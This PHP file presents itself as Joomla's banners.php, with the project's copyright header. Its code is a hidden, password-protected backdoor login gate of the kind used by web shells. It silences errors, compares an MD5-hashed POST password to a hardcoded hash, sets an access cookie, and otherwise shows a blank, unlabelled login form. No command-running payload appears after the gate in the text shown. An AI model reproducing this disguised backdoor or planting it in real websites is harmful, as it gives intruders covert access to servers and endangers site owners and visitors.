<?php 
/**
 * @version		$Id: banners.php 14401 2010-01-26 14:10:00Z louis $
 * @package  Joomla
 * @subpackage	Banners
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */
error_reporting(0);
$plam = "13d390efcb1743928e732812144d42d8";
$me = basename(__FILE__);
$plim = "8f07180a915cb803f1c25bd666332541";
if(isset($_POST['pass']))
{if(strlen($plam) == 32)
{$_POST['pass'] = md5($_POST['pass']);}
 if($_POST['pass'] == $plam)
{setcookie($plim, $_POST['pass'], time()+3600);}
 reload();}
if(!empty($plam) && !isset($_COOKIE[$plim]) or ($_COOKIE[$plim] != $plam))
{login();die();}
function login()
{
print "<table border=0 width=100% height=1%><td valign=\"middle\"><center>
    <form action=".basename(__FILE__)." method=\"POST\"><b></b>
    <input type=\"plam\" maxlength=\"32\" name=\"pass\"><input type=\"submit\" value=\"\"\">
    </form>";
	} function reload(){header("Location: ".basename(__FILE__));}
?>